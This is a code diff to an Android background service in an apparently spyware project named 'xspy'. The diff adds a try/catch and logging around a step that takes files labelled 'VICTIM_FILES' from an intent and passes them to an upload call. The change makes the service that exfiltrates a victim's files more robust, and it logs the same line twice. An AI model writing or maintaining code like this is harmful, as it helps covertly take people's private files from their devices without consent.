@@ -4,6 +4,7 @@ import android.app.Service;
 import android.content.Intent;
 import android.os.AsyncTask;
 import android.os.IBinder;
+import android.util.Log;
 import android.widget.Toast;
 
 import androidx.annotation.Nullable;
@@ -11,8 +12,10 @@ import androidx.annotation.Nullable;
 import com.redeyesncode.xspy.backend.AndroidContactModel;
 import com.redeyesncode.xspy.models.FileBody;
 import com.redeyesncode.xspy.repo.MainRepository;
+import com.redeyesncode.xspy.utils.Constants;
 
 import java.util.ArrayList;
+import java.util.Objects;
 
 public class FileUploadService extends Service {
 
@@ -35,10 +38,19 @@ public class FileUploadService extends Service {
         new Thread(new Runnable() {
             @Override
             public void run() {
-                // Call the API here
-                ArrayList<FileBody> fileBodies = intent.getParcelableArrayListExtra("VICTIM_FILES");
 
-                new ImageUploadApiCall(fileBodies).execute();
+                try{
+                    // Call the API here
+                    ArrayList<FileBody> fileBodies = intent.getParcelableArrayListExtra("VICTIM_FILES");
+
+                    new ImageUploadApiCall(fileBodies).execute();
+                }catch (Exception e){
+                    Log.i(Constants.DEV_XSPY, Objects.requireNonNull(e.getMessage()));
+                    Log.i(Constants.DEV_XSPY, Objects.requireNonNull(e.getMessage()));
+
+
+                }
+
             }
         }).start();
         return START_STICKY;
